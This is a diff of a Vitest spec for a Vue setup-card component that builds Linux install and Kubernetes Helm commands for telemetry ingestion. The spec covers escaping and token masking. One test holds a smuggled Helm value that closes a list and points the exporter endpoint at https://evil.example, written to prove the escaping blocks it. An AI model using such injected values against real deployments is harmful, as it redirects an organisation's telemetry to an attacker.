@@ -19,6 +19,7 @@
 // data source's copy.
 
 import { describe, it, expect, vi, afterEach } from "vitest";
+import { defineComponent, h } from "vue";
 import { mount, VueWrapper, flushPromises } from "@vue/test-utils";
 import { createStore } from "vuex";
 import { createRouter, createWebHistory } from "vue-router";
@@ -26,13 +27,17 @@ import SetupCardRenderer from "./SetupCardRenderer.vue";
 import { iconRegistry } from "@/lib/core/Icon/OIcon.icons";
 import type { RichCardContent } from "./types";
 import OCodeBlock from "@/lib/core/Code/OCodeBlock.vue";
+import OToggleGroup from "@/lib/core/ToggleGroup/OToggleGroup.vue";
+import OStep from "@/lib/navigation/Stepper/OStep.vue";
+import linuxCard from "./content/linux";
+import kubernetesCard from "./content/kubernetes";
+import { gt } from "@/types/i18n";
 import analytics from "@/services/product_analytics";
 
 vi.mock("@/composables/useStreams", () => ({
   default: () => ({ getStreams: vi.fn() }),
 }));
 
-// Stage-1 existence probe, driven per test for the detected-emit cases only.
 const nameListMock = vi.fn();
 vi.mock("@/services/stream", () => ({
   default: { nameList: (...a: any[]) => nameListMock(...a) },
@@ -85,12 +90,27 @@ const CONTENT: RichCardContent = {
   },
 };
 
+const barStart = vi.fn();
+const barProbeNow = vi.fn();
+// The bar's own polling is covered by FirstEventStatus.spec; here it only reports into the card.
+const FirstEventStatusStub = defineComponent({
+  name: "FirstEventStatus",
+  props: ["org", "signal", "targetStream", "match", "filter", "guideName", "docUrl", "sourceLabel"],
+  emits: ["detected", "copy-command", "state"],
+  setup(_props, { expose }) {
+    expose({ start: barStart, probeNow: barProbeNow });
+    return () => h("div", { "data-test": "first-event-status-stub" });
+  },
+});
+
 const mountCard = (content: RichCardContent = CONTENT) =>
   mount(SetupCardRenderer, {
     props: { content, subs: SUBS },
-    global: { plugins: [store, router] },
+    global: { plugins: [store, router], stubs: { FirstEventStatus: FirstEventStatusStub } },
     attachTo: document.body,
   });
+
+const bar = (wrapper: VueWrapper<any>) => wrapper.findComponent(FirstEventStatusStub);
 
 describe("SetupCardRenderer — advanced section", () => {
   let wrapper: VueWrapper<any>;
@@ -152,7 +172,7 @@ describe("SetupCardRenderer — key-as-data copy", () => {
         variants: [
           {
             id: "generic",
-            labelKey: "ingestion.setupCard.genericWindowsVariant",
+            labelKey: "ingestion.setupCard.jmxPortLabel",
             code: { lang: "bash", raw: "echo hi" },
           },
         ],
@@ -168,7 +188,7 @@ describe("SetupCardRenderer — key-as-data copy", () => {
     // inlineMd turns the `config.yaml` backticks into <code>, so match the prose.
     expect(text).toContain("set the host/port below");
     expect(text).toContain("JMX Host");
-    expect(text).toContain("Generic Windows");
+    expect(text).toContain("JMX Port");
     expect(text).not.toContain("ingestion.setupCard.");
   });
 });
@@ -271,14 +291,8 @@ describe("SetupCardRenderer — footer doc links", () => {
 });
 
 // T1.2 (design 4.2/§6): the one new emit + detect-gated action; existing cards listen to neither.
-describe("SetupCardRenderer — detected emit & showOnDetect actions", () => {
+describe("SetupCardRenderer — first-event bar, detected emit & showOnDetect actions", () => {
   let wrapper: VueWrapper<any>;
-
-  const HOST_STREAMS = [
-    { name: "system_cpu_time" },
-    { name: "system_memory_usage" },
-    { name: "system_network_io" },
-  ];
 
   const hostContent = (): RichCardContent => ({
     ...CONTENT,
@@ -302,36 +316,51 @@ describe("SetupCardRenderer — detected emit & showOnDetect actions", () => {
 
   afterEach(() => {
     if (wrapper) wrapper.unmount();
-    nameListMock.mockReset();
+    barStart.mockReset();
+    barProbeNow.mockReset();
   });
 
-  it("emits `detected` exactly once, with the stream count, on idle→connected", async () => {
-    nameListMock.mockResolvedValue({ data: { list: HOST_STREAMS } });
-    wrapper = mountCard(hostContent());
-    await wrapper.find('[data-test="ai-c-test"]').trigger("click");
-    await flushPromises();
-    expect(wrapper.emitted("detected")).toHaveLength(1);
-    expect(wrapper.emitted("detected")![0]).toEqual([HOST_STREAMS.length]);
+  it("mounts the bar on the detection step in place of the Test button", () => {
+    wrapper = mountCard();
+    expect(bar(wrapper).exists()).toBe(true);
+    expect(wrapper.find('[data-test="ai-c-test"]').exists()).toBe(false);
+    expect(wrapper.find('[data-test="ai-c-statusbar"]').exists()).toBe(false);
   });
 
-  it("emits `detected` once on stalled→connected, not on the failed check", async () => {
-    nameListMock.mockResolvedValueOnce({ data: { list: [] } });
-    wrapper = mountCard(hostContent());
-    await wrapper.find('[data-test="ai-c-test"]').trigger("click");
-    await flushPromises();
-    expect(wrapper.emitted("detected")).toBeUndefined();
+  it("hands the bar the card's own detect stream and filter, so Test and the bar never disagree", () => {
+    wrapper = mountCard();
+    expect(bar(wrapper).props()).toMatchObject({
+      org: "test-org",
+      signal: "logs",
+      targetStream: "default",
+      filter: "a IS NOT NULL",
+      guideName: "Demo",
+    });
+  });
 
-    nameListMock.mockResolvedValue({ data: { list: HOST_STREAMS } });
-    await wrapper.find('[data-test="ai-c-recheck"]').trigger("click");
+  it("hands a keyword-matched card's name fragment and match mode to the bar", () => {
+    wrapper = mountCard(hostContent());
+    expect(bar(wrapper).props()).toMatchObject({
+      signal: "metrics",
+      targetStream: "system_",
+      match: "keyword",
+      filter: undefined,
+    });
+  });
+
+  it("emits `detected` exactly once, with the count, when the bar reports data", async () => {
+    wrapper = mountCard(hostContent());
+    bar(wrapper).vm.$emit("detected", { count: 3 });
     await flushPromises();
-    expect(wrapper.emitted("detected")).toHaveLength(1);
+    bar(wrapper).vm.$emit("detected", { count: 5 });
+    await flushPromises();
+    expect(wrapper.emitted("detected")).toEqual([[3]]);
   });
 
   it("tracks data_source_connected with the provider id, not its label, on connect", async () => {
     vi.mocked(analytics.track).mockClear();
-    nameListMock.mockResolvedValue({ data: { list: HOST_STREAMS } });
     wrapper = mountCard(hostContent());
-    await wrapper.find('[data-test="ai-c-test"]').trigger("click");
+    bar(wrapper).vm.$emit("detected", { count: 3 });
     await flushPromises();
     expect(analytics.track).toHaveBeenCalledTimes(1);
     expect(analytics.track).toHaveBeenCalledWith("data_source_connected", {
@@ -340,28 +369,16 @@ describe("SetupCardRenderer — detected emit & showOnDetect actions", () => {
     });
   });
 
-  it("does not track data_source_connected when the check finds nothing", async () => {
-    vi.mocked(analytics.track).mockClear();
-    nameListMock.mockResolvedValue({ data: { list: [] } });
-    wrapper = mountCard(hostContent());
-    await wrapper.find('[data-test="ai-c-test"]').trigger("click");
-    await flushPromises();
-    expect(analytics.track).not.toHaveBeenCalledWith("data_source_connected", expect.anything());
-  });
-
   it("does not emit `detected` on a fresh mount (no transition happened)", async () => {
-    nameListMock.mockResolvedValue({ data: { list: HOST_STREAMS } });
     wrapper = mountCard(hostContent());
     await flushPromises();
-    // Detection is click-driven; a remount starts idle and must stay silent.
     expect(wrapper.emitted("detected")).toBeUndefined();
   });
 
   it("hides a showOnDetect action pre-connect and reveals it post-connect", async () => {
-    nameListMock.mockResolvedValue({ data: { list: HOST_STREAMS } });
     wrapper = mountCard(hostContent());
     expect(wrapper.find('[data-test="ai-step-action-view-host-dashboard"]').exists()).toBe(false);
-    await wrapper.find('[data-test="ai-c-test"]').trigger("click");
+    bar(wrapper).vm.$emit("detected", { count: 3 });
     await flushPromises();
     expect(wrapper.find('[data-test="ai-step-action-view-host-dashboard"]').exists()).toBe(true);
   });
@@ -380,6 +397,53 @@ describe("SetupCardRenderer — detected emit & showOnDetect actions", () => {
     };
     wrapper = mountCard(content);
     expect(wrapper.find('[data-test="ai-step-action-launch-console"]').exists()).toBe(true);
+  });
+
+  it("shows the most-likely-fix box only once the bar has a diagnosis, and rechecks through the bar", async () => {
+    const content: RichCardContent = {
+      ...CONTENT,
+      extras: { ...CONTENT.extras, fixSnippet: "import otel_first" },
+    };
+    wrapper = mountCard(content);
+    expect(wrapper.find('[data-test="ai-fix-code"]').exists()).toBe(false);
+    bar(wrapper).vm.$emit("state", "no-requests");
+    await flushPromises();
+    expect(wrapper.find('[data-test="ai-fix-code"]').exists()).toBe(true);
+    await wrapper.find('[data-test="ai-c-fix-recheck"]').trigger("click");
+    expect(barProbeNow).toHaveBeenCalledTimes(1);
+    bar(wrapper).vm.$emit("state", "received");
+    await flushPromises();
+    expect(wrapper.find('[data-test="ai-fix-code"]').exists()).toBe(false);
+  });
+
+  it("re-copies through the first step's own block when the bar asks for the command", async () => {
+    wrapper = mountCard();
+    const copyBtn = wrapper.find('[data-test="ingestion-setup-code-block-copy-btn"]');
+    expect(copyBtn.exists()).toBe(true);
+    const clicked = vi.fn();
+    copyBtn.element.addEventListener("click", clicked);
+    bar(wrapper).vm.$emit("copy-command");
+    expect(clicked).toHaveBeenCalledTimes(1);
+  });
+
+  it("names the cluster or host only once the user typed one, never the input's default (B5)", async () => {
+    const content: RichCardContent = {
+      ...CONTENT,
+      steps: [
+        {
+          ...CONTENT.steps[0],
+          inputs: [{ id: "cluster", label: "Cluster", default: "acme-prod-eks" } as any],
+        },
+        CONTENT.steps[1],
+      ],
+    };
+    wrapper = mountCard(content);
+    expect(bar(wrapper).props("sourceLabel")).toBeUndefined();
+    const input = wrapper.find('[data-test="ai-input-cluster"] input');
+    await input.setValue("web-07");
+    expect(bar(wrapper).props("sourceLabel")).toBe("web-07");
+    await input.setValue("acme-prod-eks");
+    expect(bar(wrapper).props("sourceLabel")).toBeUndefined();
   });
 });
 
@@ -458,13 +522,311 @@ describe("SetupCardRenderer — product analytics", () => {
     if (wrapper) wrapper.unmount();
   });
 
-  it("tracks snippet_copied with the current route when a step is copied", () => {
+  it("tracks snippet_copied with the current route and partial flag, and restarts the bar's fast cadence", () => {
     wrapper = mountCard();
 
-    wrapper.findComponent(OCodeBlock).vm.$emit("copy");
+    wrapper.findComponent(OCodeBlock).vm.$emit("copy", { partial: true });
 
     expect(analytics.track).toHaveBeenCalledWith("snippet_copied", {
       route: router.currentRoute.value.name,
+      partial: true,
     });
+    expect(barStart).toHaveBeenCalledWith("copy");
+  });
+
+  it("makes every step block copy on click and names the token only where it is masked", () => {
+    const content: RichCardContent = {
+      ...CONTENT,
+      steps: [
+        { ...CONTENT.steps[0], code: { lang: "bash", raw: "key=pc", masked: "key=••" } },
+        CONTENT.steps[1],
+      ],
+    };
+    const tokenStore = createStore({
+      state: {
+        selectedOrganization: { identifier: "test-org" },
+        userInfo: { email: "t@e.com" },
+        organizationData: {
+          organizationPasscode: "pc",
+          orgTokens: [{ name: "default", token: "pc" }],
+        },
+        theme: "light",
+      },
+    });
+    wrapper = mount(SetupCardRenderer, {
+      props: { content, subs: SUBS },
+      global: {
+        plugins: [tokenStore, router],
+        stubs: { FirstEventStatus: FirstEventStatusStub },
+      },
+    });
+    const block = wrapper.findComponent(OCodeBlock);
+    expect(block.props("tokenName")).toBe("default");
+  });
+});
+
+describe("SetupCardRenderer — Linux install step tracing toggle", () => {
+  let wrapper: VueWrapper<any>;
+
+  afterEach(() => {
+    if (wrapper) wrapper.unmount();
+  });
+
+  const LINUX_SUBS = { ...SUBS, token: "dGVzdEB0b2tlbg==" };
+  const BASE_TAIL = `./install.sh ${LINUX_SUBS.url}/api/${LINUX_SUBS.org}/ ${LINUX_SUBS.token}`;
+  const installBlock = () => wrapper.findAllComponents(OCodeBlock)[0];
+  const installNotes = () =>
+    wrapper.find('[data-test="ai-variant-tabs"]').element.parentElement!.textContent ?? "";
+  const field = (id: string) => wrapper.find(`[data-test="ai-input-${id}"]`);
+  const type = (id: string, v: string) => field(id).find("input").setValue(v);
+  const warning = () => wrapper.find('[data-test="ai-variant-require-install"]');
+  const pick = async (id: string) => {
+    wrapper.findAllComponents(OToggleGroup)[0].vm.$emit("update:modelValue", id);
+    await flushPromises();
+  };
+  const mountLinux = () =>
+    mount(SetupCardRenderer, {
+      props: { content: linuxCard(LINUX_SUBS, gt), subs: LINUX_SUBS },
+      global: { plugins: [store, router], stubs: { FirstEventStatus: FirstEventStatusStub } },
+      attachTo: document.body,
+    });
+
+  it("shows the tracing fields only under traces, and leaves the default command unchanged", async () => {
+    wrapper = mountLinux();
+    expect(installBlock().props("code").endsWith(BASE_TAIL)).toBe(true);
+    expect(installNotes()).not.toContain("BTF");
+    for (const id of ["ports", "exe", "cmd", "serviceName"]) expect(field(id).exists()).toBe(false);
+    expect(wrapper.find('[data-test="ai-step-inputs-install"]').exists()).toBe(false);
+
+    await pick("traces");
+    for (const id of ["ports", "exe", "cmd", "serviceName"]) expect(field(id).exists()).toBe(true);
+    expect(installNotes()).toContain("BTF");
+    expect(warning().exists()).toBe(false);
+    expect(installBlock().props("code").endsWith(`${BASE_TAIL} --trace-ports '8080'`)).toBe(true);
+
+    await pick("logs-metrics");
+    expect(field("ports").exists()).toBe(false);
+    expect(installBlock().props("code").endsWith(BASE_TAIL)).toBe(true);
+  });
+
+  it("emits all four flags in order, single-quoted, with the token still masked", async () => {
+    wrapper = mountLinux();
+    await pick("traces");
+    await type("ports", "80,443,8000-8999");
+    await type("exe", "/opt/my app/*");
+    await type("cmd", "*it's.py*");
+    await type("serviceName", "checkout");
+    const flags =
+      " --trace-ports '80,443,8000-8999' --trace-exe '/opt/my app/*'" +
+      " --trace-cmd '*it'\\''s.py*' --service-name 'checkout'";
+    expect(installBlock().props("code").endsWith(`${BASE_TAIL}${flags}`)).toBe(true);
+    expect(installBlock().props("codeMasked").endsWith(flags)).toBe(true);
+    expect(installBlock().props("codeMasked")).not.toContain(LINUX_SUBS.token);
+  });
+
+  it("keeps a typed $ literal inside the quotes", async () => {
+    wrapper = mountLinux();
+    await pick("traces");
+    await type("exe", "/opt/$$x/*a$&$");
+    expect(installBlock().props("code").endsWith(` --trace-exe '/opt/$$x/*a$&$'`)).toBe(true);
+  });
+
+  it("omits blank (or whitespace-only) fields instead of falling back to a default", async () => {
+    wrapper = mountLinux();
+    await pick("traces");
+    await type("ports", "   ");
+    await type("cmd", "*reports.py*");
+    expect(installBlock().props("code").endsWith(`${BASE_TAIL} --trace-cmd '*reports.py*'`)).toBe(
+      true,
+    );
+  });
+
+  it("warns and hides the command when no selector is filled", async () => {
+    wrapper = mountLinux();
+    await pick("traces");
+    await type("serviceName", "checkout");
+    await type("ports", "");
+    expect(warning().exists()).toBe(true);
+    expect(warning().text()).toContain("Fill in at least one");
+    const codes = wrapper.findAllComponents(OCodeBlock).map((b) => b.props("code"));
+    expect(codes.some((c) => c.includes("install.sh"))).toBe(false);
+
+    await type("exe", "/opt/myapp/*");
+    expect(warning().exists()).toBe(false);
+    expect(
+      installBlock()
+        .props("code")
+        .endsWith(" --trace-exe '/opt/myapp/*' --service-name 'checkout'"),
+    ).toBe(true);
+  });
+
+  it("scrolls to the install step when the bar asks for a command that is hidden", async () => {
+    wrapper = mountLinux();
+    await pick("traces");
+    await type("ports", "");
+    expect(warning().exists()).toBe(true);
+    const original = (Element.prototype as any).scrollIntoView;
+    const scrollSpy = vi.fn();
+    (Element.prototype as any).scrollIntoView = scrollSpy;
+    try {
+      bar(wrapper).vm.$emit("copy-command");
+      expect(scrollSpy).toHaveBeenCalledTimes(1);
+      expect((scrollSpy.mock.contexts[0] as Element).contains(warning().element)).toBe(true);
+    } finally {
+      (Element.prototype as any).scrollIntoView = original;
+    }
+  });
+
+  it("marks the install step done when the traces command is copied", async () => {
+    wrapper = mountLinux();
+    await pick("traces");
+    const step = () => wrapper.findAllComponents(OStep)[0];
+    expect(step().props("done")).toBe(false);
+    installBlock().vm.$emit("copy", { partial: false });
+    await flushPromises();
+    expect(step().props("done")).toBe(true);
+  });
+
+  it("leaves step-level inputs where they were (Kubernetes cluster name)", async () => {
+    wrapper = mount(SetupCardRenderer, {
+      props: { content: kubernetesCard(LINUX_SUBS, gt), subs: LINUX_SUBS },
+      global: { plugins: [store, router], stubs: { FirstEventStatus: FirstEventStatusStub } },
+      attachTo: document.body,
+    });
+    expect(
+      wrapper.find('[data-test="ai-step-inputs-install"] [data-test="ai-input-cluster"]').exists(),
+    ).toBe(true);
+    expect(wrapper.find('[data-test="ai-variant-inputs-install"]').exists()).toBe(false);
+    await wrapper.find('[data-test="ai-input-cluster"] input').setValue("prod-eu");
+    expect(installBlock().props("code")).toContain("--cluster-name=prod-eu");
+    await wrapper.find('[data-test="ai-input-cluster"] input').setValue("");
+    expect(installBlock().props("code")).not.toContain("cluster1");
+  });
+});
+
+describe("SetupCardRenderer — Kubernetes instrument step (nested toggle)", () => {
+  let wrapper: VueWrapper<any>;
+
+  afterEach(() => {
+    if (wrapper) wrapper.unmount();
+  });
+
+  const BASE = `helm repo update openobserve
+helm --namespace openobserve-collector upgrade o2c openobserve/openobserve-collector \\
+  --version '>=0.6.0' --reset-then-reuse-values \\
+  --set ebpf.enabled=true`;
+  const codes = () => wrapper.findAllComponents(OCodeBlock).map((b) => b.props("code") as string);
+  const instrumentCode = () =>
+    codes().find((c) => c.includes("kubectl annotate") || c.includes("upgrade o2c"));
+  const field = (id: string) => wrapper.find(`[data-test="ai-input-${id}"]`);
+  const type = (id: string, v: string) => field(id).find("input").setValue(v);
+  const warning = () => wrapper.find('[data-test="ai-variant-require-instrument"]');
+  const subTabs = () => wrapper.find('[data-test="ai-subvariant-tabs-instrument"]');
+  const pickTop = async (id: string) => {
+    const tabs = wrapper
+      .findAll('[data-test="ai-variant-tabs"]')
+      .find((t) => t.find('[data-test="ai-variant-ebpf"]').exists())!;
+    tabs.findComponent(OToggleGroup).vm.$emit("update:modelValue", id);
+    await flushPromises();
+  };
+  const pickSub = async (id: string) => {
+    subTabs().findComponent(OToggleGroup).vm.$emit("update:modelValue", id);
+    await flushPromises();
+  };
+  const mountK8s = () =>
+    mount(SetupCardRenderer, {
+      props: { content: kubernetesCard(SUBS, gt), subs: SUBS },
+      global: { plugins: [store, router], stubs: { FirstEventStatus: FirstEventStatusStub } },
+      attachTo: document.body,
+    });
+
+  it("renders the nested language toggle under language libraries and switches code", async () => {
+    wrapper = mountK8s();
+    expect(subTabs().exists()).toBe(true);
+    for (const id of ["java", "dotnet", "nodejs", "python"]) {
+      expect(subTabs().find(`[data-test="ai-variant-${id}"]`).exists()).toBe(true);
+    }
+    expect(instrumentCode()).toContain("inject-java=");
+    await pickSub("python");
+    expect(instrumentCode()).toContain("inject-python=");
+    expect(instrumentCode()).not.toContain("inject-java=");
+
+    await pickTop("ebpf");
+    expect(subTabs().exists()).toBe(false);
+    await pickTop("libraries");
+    // Each top-level choice remembers its own nested selection.
+    expect(instrumentCode()).toContain("inject-python=");
+  });
+
+  it("shows the eBPF fields only under eBPF, opening with nothing selected", async () => {
+    wrapper = mountK8s();
+    for (const id of ["ebpfPorts", "ebpfExe", "ebpfCmd"]) expect(field(id).exists()).toBe(false);
+    await pickTop("ebpf");
+    for (const id of ["ebpfPorts", "ebpfExe", "ebpfCmd"]) expect(field(id).exists()).toBe(true);
+    expect(warning().exists()).toBe(true);
+    expect(codes().some((c) => c.includes("upgrade o2c"))).toBe(false);
+
+    await type("ebpfPorts", "8080");
+    expect(warning().exists()).toBe(false);
+    expect(instrumentCode()).toBe(
+      `${BASE} \\\n  --set-string 'ebpf.trace.ports={8080}'` +
+        ` \\\n  --set ebpf.trace.exePaths=null \\\n  --set ebpf.trace.cmdLines=null`,
+    );
+  });
+
+  it("emits one --set-string per filled field, in order, with comma-split quoted lists", async () => {
+    wrapper = mountK8s();
+    await pickTop("ebpf");
+    await type("ebpfPorts", " 8080, 9000-9100 ,,");
+    await type("ebpfExe", "/app/it's*");
+    await type("ebpfCmd", "*reports.py*, *worker*");
+    expect(instrumentCode()).toBe(
+      `${BASE} \\\n  --set-string 'ebpf.trace.ports={8080,9000-9100}'` +
+        ` \\\n  --set-string 'ebpf.trace.exePaths={/app/it'\\''s*}'` +
+        ` \\\n  --set-string 'ebpf.trace.cmdLines={*reports.py*,*worker*}'`,
+    );
+  });
+
+  it("sets blank fields to null so a selector from an earlier run is cleared", async () => {
+    wrapper = mountK8s();
+    await pickTop("ebpf");
+    await type("ebpfPorts", "  ");
+    await type("ebpfCmd", "*reports.py*");
+    expect(instrumentCode()).toBe(
+      `${BASE} \\\n  --set ebpf.trace.ports=null \\\n  --set ebpf.trace.exePaths=null` +
+        ` \\\n  --set-string 'ebpf.trace.cmdLines={*reports.py*}'`,
+    );
+  });
+
+  it("warns and hides the command when every selector is blank", async () => {
+    wrapper = mountK8s();
+    await pickTop("ebpf");
+    expect(warning().exists()).toBe(true);
+    expect(warning().text()).toContain("Fill in at least one");
+    expect(codes().some((c) => c.includes("upgrade o2c"))).toBe(false);
+  });
+
+  it("escapes backslashes and braces so a value cannot close the Helm list", async () => {
+    wrapper = mountK8s();
+    await pickTop("ebpf");
+    await type(
+      "ebpfCmd",
+      "*x*},exporters.otlphttp/openobserve.endpoint=https://evil.example,ebpf.trace.cmdLines={*y*",
+    );
+    await type("ebpfExe", String.raw`*a\b*`);
+    expect(instrumentCode()).toBe(
+      `${BASE} \\\n  --set ebpf.trace.ports=null` +
+        ` \\\n  --set-string 'ebpf.trace.exePaths={*a\\\\b*}'` +
+        ` \\\n  --set-string 'ebpf.trace.cmdLines={*x*\\},exporters.otlphttp/openobserve.endpoint=https://evil.example,ebpf.trace.cmdLines=\\{*y*}'`,
+    );
+  });
+
+  it("treats a field holding only commas and spaces as blank", async () => {
+    wrapper = mountK8s();
+    await pickTop("ebpf");
+    await type("ebpfPorts", " ,,, ");
+    await type("ebpfExe", ",");
+    expect(warning().exists()).toBe(true);
+    expect(codes().some((c) => c.includes("upgrade o2c"))).toBe(false);
   });
 });
